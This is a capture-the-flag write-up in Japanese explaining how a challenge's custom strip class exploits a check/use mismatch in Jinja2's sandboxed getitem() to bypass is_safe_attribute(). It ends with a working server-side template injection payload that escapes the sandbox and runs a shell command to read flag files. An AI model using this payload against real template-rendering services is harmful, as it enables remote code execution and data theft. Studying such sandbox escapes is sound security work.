# jinjail

## / Overview

jinja2 の SandboxedEnvironment における`getattr()`と`is_safe_attribute()`のTOCTOU

## / Writeup

jinja2 といえば SSTI を使った Pyjail です。実際 `{{ 1+1 }}` を入力すると 2 が出力されることから確認できます。

この問題の難しいところは、[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md) にあるような典型的なペイロードが通用しないことです。これは SandboxedEnvironment でテンプレート文がレンダリングされるためです。[公式ドキュメント](https://jinja.palletsprojects.com/en/stable/sandbox/)でも「信用できないテンプレート文を実行するのに使える」と書いてあります。

> The Jinja sandbox can be used to render untrusted templates. Access to attributes, method calls, operators, mutating data structures, and string formatting can be intercepted and prohibited.

どこでブロックされているのかを確かめるために、ペイロードを段階的に試していくと、`{{ ''.__class__ }}`の段階で既に出力がなくなっている事が分かります。回避する方法を模索してみましたが、ことごとく失敗しました。

stripクラスの独自実装は気になりますが、どの様に活用できるか分からなかったので一旦ソースコードのチェックに移ります。先程の公式ドキュメントを調べてみるとSandbox環境において危険な属性値の入力を弾いているのは `is_safe_attribute()` という関数だそうです。「アンダースコアで始まる属性値は全て弾く」という説明があり、今回の現象を説明できます。さらにその実装を見てみると、`startswith("_")`でチェックしていることが分かります。

```python
[58] > /usr/lib/python3/dist-packages/jinja2/sandbox.py(248)is_safe_attribute(), --Call--
248         def is_safe_attribute(self, obj: t.Any, attr: str, value: t.Any) -> bool:
249             """The sandboxed environment will call this method to check if the
250             attribute of an object is safe to access.  Per default all attributes
251             starting with an underscore are considered private as well as the
252             special attributes of internal python objects as returned by the
253             :func:`is_internal_attribute` function.
254             """
255             return not (attr.startswith("_") or is_internal_attribute(obj, attr))
```

逆に言えばアンダースコアで始まらなければこのフィルタを突破できるかも知れません。しかし、まだ有効な解法を思いつかないので、次にこの関数の呼び出し元の関数を見てみます。

```python
[12] > /usr/lib/python3/dist-packages/jinja2/sandbox.py(331)getattr()
314         def getattr(self, obj: t.Any, attribute: str) -> t.Union[t.Any, Undefined]:
315             """Subscribe an object from sandboxed code and prefer the
316             attribute.  The attribute passed *must* be a bytestring.
317             """
318             try:
319                 value = getattr(obj, attribute)
320             except AttributeError:
321                 try:
322                     return obj[attribute]
323                 except (TypeError, LookupError):
324                     pass
325             else:
326                 fmt = self.wrap_str_format(value)
327                 if fmt is not None:
328                     return fmt
329                 if self.is_safe_attribute(obj, attribute, value):
330                     return value
331                 return self.unsafe_undefined(obj, attribute)
332             return self.undefined(obj=obj, name=attribute)
```

319行目では `{{ ''.__class__ }}` が入力の時に `getattr('', "__class__") -> <class 'str'>` になりますが、329行目の`is_safe_attribute()` に引っかかるためオブジェクトが return されません。しかし322行目を見ると `getitem` 形式でも同様に属性の取得が出来ることが分かります。つまり `{{ ''["__class__"] }}` でも同じ結果が得られるはずです。実装を見てみましょう。

```python
[57] > /usr/lib/python3/dist-packages/jinja2/sandbox.py(301)getitem()
288         def getitem(
289             self, obj: t.Any, argument: t.Union[str, t.Any]
290         ) -> t.Union[t.Any, Undefined]:
291             """Subscribe an object from sandboxed code."""
292             try:
293                 return obj[argument]
294             except (TypeError, LookupError):
295                 if isinstance(argument, str):
296                     try:
297                         attr = str(argument)
298                     except Exception:
299                         pass
300                     else:
301                         try:
302                             value = getattr(obj, attr)
303                         except AttributeError:
304                             pass
305                         else:
306                             fmt = self.wrap_str_format(value)
307                             if fmt is not None:
308                                 return fmt
309                             if self.is_safe_attribute(obj, argument, value):
310                                 return value
311                             return self.unsafe_undefined(obj, argument)
312             return self.undefined(obj=obj, name=argument)
```

302行目と309行目を見てください。`getattr()` では属性値を `attr` 変数から取っているのに対して、`is_safe_attribute()` は `argument` で属性が危険かを判断しており、解釈に差が生まれています。さらに297行目を見ると `attr` は `argument` をstr化したものであると分かります。

そしてここでstripクラスが役に立ちます。もし `{{ ''[ " __class__ "|strip ] }}` と入力するとどうなるでしょうか。前後にスペースが入った `" __class__ "`は `getitem()` で `argument` として処理されます。297行目でstr化するときは `__str__` が呼び出されますが、ここで独自実装のおかげで文字列の前後のスペースが取り除かれます。したがって `attr` には `"__class__"` が代入されます。

スペースが無くなった事によって正常な属性 `getattr(obj, attr) -> <class 'str'>` が得られる一方で、`is_safe_attribute()` は `argument` がスペースから始まるせいでフィルタを回避できる可能性があります。

実際に試してみると `<class 'str'>` が出力されたのでフィルタの回避に成功していることが分かりました。あとは任意コード実行出来るペイロードをstrip版に書き換えるとフラグを取得できます。

## / Payload

```
{{
    ""[" __class__ " | strip][" __mro__ " | strip][1]
     [" __subclasses__ " | strip]()[166]
     [" __init__ " | strip]
     [" __globals__ " | strip]
     ["__builtins__"]
     ["__import__"]("os")
     .popen("cat /flag*").read() 
}}
```